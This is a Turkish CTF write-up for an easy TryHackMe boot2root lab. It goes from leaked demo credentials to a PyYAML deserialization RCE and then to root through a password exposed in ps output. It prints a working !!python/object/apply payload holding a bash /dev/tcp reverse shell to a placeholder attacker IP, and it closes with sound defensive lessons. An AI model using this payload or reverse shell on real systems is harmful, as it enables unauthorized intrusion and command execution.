> TryHackMe · Hacker Holidays 2026 · Easy · Boot2Root
{: .prompt-info }

Bir jukebox web uygulamasının playlist'i YAML olarak export/import etmesine izin vermesiyle başlayan; HTML kaynağında bırakılmış demo kimlik bilgileri, PyYAML'ın güvensiz deserializasyonu üzerinden RCE ve process listesinde açıkta kalan bir servis parolasıyla root'a uzanan bir boot2root makinesi.

| Hedef | Zorluk | Kategori |
|---|---|---|
| 10.82.177.213 | Easy | Web / Boot2root |

**Zincir:** Nmap Recon → HTML kaynağında sızan demo giriş bilgisi (dj/dj) → YAML export/import özelliği → PyYAML `!!python/object/apply` RCE → reverse shell (bartender) → root process'inin komut satırında açık şifre → root

## 01 — Keşif

```console
$ nmap -sC -sV -p- -T4 10.82.177.213
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Gunicorn
|_http-title: Beach Bar // Sign in
|_Requested resource was /login
```

`/login` sayfasının HTML kaynağında, üretime hiç gitmemesi gereken bir yorum satırı vardı:

```html
<!--
  staff note: the demo DJ login is still enabled for the soft opening.
  dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```

`dj` / `dj` ile giriş yapıldığında bir jukebox/playlist yönetim paneli açıldı: 42 şarkı kuyrukta, "Sunset Session" adlı aktif bir set çalıyordu. Panelde **Export** (playlist'i YAML olarak indir) ve **Import** (YAML'ı geri yükle) özellikleri vardı.

## 02 — Foothold: PyYAML güvensiz deserializasyon

Export edilen dosya standart bir YAML yapısındaydı:

```yaml
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

Sunucunun bu dosyayı **Import** ederken muhtemelen `yaml.load()` (güvenli olmayan, `Loader` belirtilmemiş hali) kullandığı varsayımıyla, PyYAML'ın `!!python/object/apply` tag'i kullanılarak rastgele Python fonksiyonu (dolayısıyla `os.system`) çalıştırılabilecek bir payload hazırlandı:

```yaml
playlist:
  name: !!python/object/apply:os.system
    args: ["bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"]
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

Bu dosya **Import** özelliğinden yüklendiğinde, YAML parse edilirken (uygulamanın geri kalan mantığı çalışmadan önce, obje inşa anında) komut çalıştırıldı ve dinleyen netcat oturumuna bağlantı geldi:

```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.129.166] from (UNKNOWN) [10.82.177.213] 56280
bash: cannot set terminal process group (613): Inappropriate ioctl for device
bash: no job control in this shell
bartender@tryhackme-2404:/opt/beach-bar/webapp$
```

```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ cat /home/*/user.txt
```

> ✅ `bartender` kullanıcısıyla erişim ve user flag ele geçirildi
{: .prompt-tip }

## 03 — Yetki Yükseltme: process listesinde açık kalan parola

Klasik privesc kontrollerinde (SUID, `getcap`, cron) dikkat çekici bir şey çıkmadı, ama `/opt/beach-bar/` altında ayrı bir `jukeboxd` dizini bulundu — arka planda root olarak çalışan bir stream servisi:

```console
$ ps aux | grep jukeboxd
root  612  0.0  0.2  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

Servisin başlatma parolası (`--stream-pass`), komut satırı argümanı olarak verildiği için `/proc/<pid>/cmdline` ve `ps aux` çıktısında **herkese açık** durumdaydı. Bu parola aynı zamanda root'un kendi kimlik bilgisiydi:

```console
$ su root
Password: SunsetSpritz2024!
# cat /root/root.txt
```

> ✅ root erişimi sağlandı — makine tamamlandı
{: .prompt-tip }

## Özet — Öğrenilen teknikler

- Bir uygulama YAML "export/import" gibi bir özellik sunduğunda, bunun genellikle sunucu tarafında `yaml.load()`/`yaml.unsafe_load()` çağrısı anlamına gelebileceği ve `!!python/object/apply` tag'iyle rastgele kod çalıştırmaya (RCE) açık olabileceği — güvenli kullanım her zaman `yaml.safe_load()` gerektirir.
- HTML kaynak koduna bırakılan "geçici/demo" yorumların (kimlik bilgileri dahil) prodüksiyona sızabileceği.
- Servislere komut satırından parola geçirmenin (`--stream-pass` gibi), aynı makinedeki herhangi bir kullanıcının `ps aux` ile bu parolayı doğrudan okuyabilmesi anlamına geldiği — hassas değerler ortam değişkeni (yine riskli) ya da bir secrets dosyası/vault üzerinden verilmeli.
